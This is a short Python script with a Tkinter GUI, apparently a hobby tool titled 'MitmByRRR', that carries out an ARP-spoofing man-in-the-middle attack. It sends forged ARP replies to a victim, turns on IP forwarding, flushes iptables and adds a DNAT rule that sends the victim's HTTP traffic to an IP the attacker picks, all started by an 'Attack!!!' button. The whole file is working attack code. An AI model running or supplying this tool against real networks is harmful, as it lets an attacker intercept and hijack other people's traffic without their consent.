#!usr/bin/python
import os
import Tkinter as Tkinter
from scapy.all import *

def Attack():
	enableIPforwarding()
	flushIPtablesandSetupRedirect()
	sendARPreply()

def sendARPreply():
	pkt=ARP()
	pkt.psrc=RouterIP.get()
	pkt.pdst=VictimIP.get()
	try:
		while 1:
			send(pkt)
			time.sleep(1)
	except KeyboardInterrupt:
		pass

def enableIPforwarding():
	f = open("/proc/sys/net/ipv4/ip_forward", "w")
	f.write('1') #ipforwarding enabled! so that we don't drop any packets, we did not request for!
	f.close()
	f = open("/proc/sys/net/ipv4/conf/" + Interface.get() + "/send_redirects", "w")#ICMP redirects turned off
	f.write('0')
	f.close()


def flushIPtablesandSetupRedirect():#description of rules given at the end, and in the document :)
	os.system("/sbin/iptables --flush")
	os.system("/sbin/iptables -t nat --flush")
	os.system("/sbin/iptables --zero")
	os.system("/sbin/iptables -A FORWARD --in-interface " +  Interface.get() + " -j ACCEPT")
	os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface " + Interface.get() + " -j MASQUERADE")
	os.system("/sbin/iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination " + RedirectIP.get())

#main starts here, GUI part
root=Tkinter.Tk()
root.wm_title("MitmByRRR:)")


RouterIP_label= Tkinter.Label(root, text="Router IP")
RouterIP_label.pack()
RouterIP = Tkinter.Entry(root, bd =5)#bd=size of border
RouterIP.pack()

VictimIP_label= Tkinter.Label(root, text="Victim IP")
VictimIP_label.pack()
VictimIP = Tkinter.Entry(root, bd =5)
VictimIP.pack()

RedirectIP_label= Tkinter.Label(root, text="Redirect IP")#use "host" terminal command to lookup IP of any website
RedirectIP_label.pack()
RedirectIP = Tkinter.Entry(root, bd =5)
RedirectIP.pack()

Interface_label= Tkinter.Label(root, text="Interface name")
Interface_label.pack()
Interface = Tkinter.Entry(root, bd =5)
Interface.pack()


ok=Tkinter.Button(root,text="Attack!!!",command=Attack)
ok.pack()
root.mainloop()
